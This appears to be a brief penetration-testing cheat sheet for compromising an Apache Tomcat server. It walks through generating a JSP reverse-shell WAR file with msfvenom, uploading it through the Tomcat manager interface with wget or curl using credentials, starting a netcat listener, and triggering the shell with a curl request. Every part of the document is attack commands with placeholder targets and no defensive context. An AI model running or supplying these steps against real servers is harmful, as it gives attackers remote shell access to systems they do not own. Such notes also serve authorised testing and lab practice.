- - -
💢️ **Generate payload**
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
``` 

- [ ] Go and Upload payload

**(** **Tomcat6** **: )** 🌊️   --> <mark style="background: #FFF3A3A6;">If using Tomcat 6</mark>
```sh
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
```

**(** **Tomcat7 and above** **: )** 🌊️ --> <mark style="background: #FFB8EBA6;">If using Tomcat 7 and above..</mark>
```sh
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'
```

💢️ **Setup a Listener**
```sh
nc -lvp <PORT>
``` 

💢️ **Execute payload**

( **yes !!** **don't include** **.war** **)**
```sh
curl http://<IP>:8080/shell/ 
``` 

- - -

 